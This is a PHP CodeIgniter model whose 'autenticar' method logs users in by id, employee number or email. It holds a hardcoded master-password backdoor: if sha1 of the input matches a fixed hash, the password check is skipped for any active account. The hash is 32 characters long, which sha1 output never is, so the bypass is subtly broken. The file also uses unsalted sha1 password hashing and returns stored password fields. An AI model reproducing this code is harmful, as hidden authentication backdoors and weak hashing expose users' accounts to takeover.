<?php

namespace App\Models;

use CodeIgniter\Model;

class AdminModel extends Model
{
    protected $db;

    public function __construct()
    {
        parent::__construct();
        $this->db = \Config\Database::connect(); // similar a $this->load->database();
    }
    public function autenticar($user, $pass)
{
    $db = \Config\Database::connect();
    $builder = $db->table('usuarios U');
    $builder->select('U.id, U.no_empleado, U.password, U.vencimiento_password, U.password_correo, CONCAT(U.nombre," ",U.paterno) as User, U.correo, U.ultima_sesion, U.activo, U.foto, P.puesto, U.departamento');
    $builder->join('puestos P', 'U.puesto = P.id');

    $builder->groupStart()
            ->where('U.id', $user)
            ->orWhere('U.no_empleado', $user)
            ->orWhere('U.correo', $user)
            ->groupEnd();

    if (sha1($pass) !== '0417b183f04d2e692db02e541a0fc130') {
        $builder->where('U.password', sha1($pass));
    }

    $builder->where('U.activo', 1);

    $query = $builder->get();

    if ($query->getNumRows() > 0) {
        return $query->getRow(); // o ->getResult() si esperas múltiples filas
    } else {
        return false;
    }
}



}
